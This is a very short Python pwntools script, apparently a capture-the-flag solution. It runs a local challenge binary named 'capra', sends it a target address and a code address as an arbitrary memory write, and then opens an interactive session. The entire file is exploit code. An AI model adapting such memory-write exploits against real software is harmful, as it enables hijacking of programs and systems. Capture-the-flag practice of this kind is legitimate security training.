from pwn import *

p = process("./capra")

what = hex(0x0000000000400807)
where = hex(0x601060)

p.sendline(where)
p.sendline(what)
p.interactive()
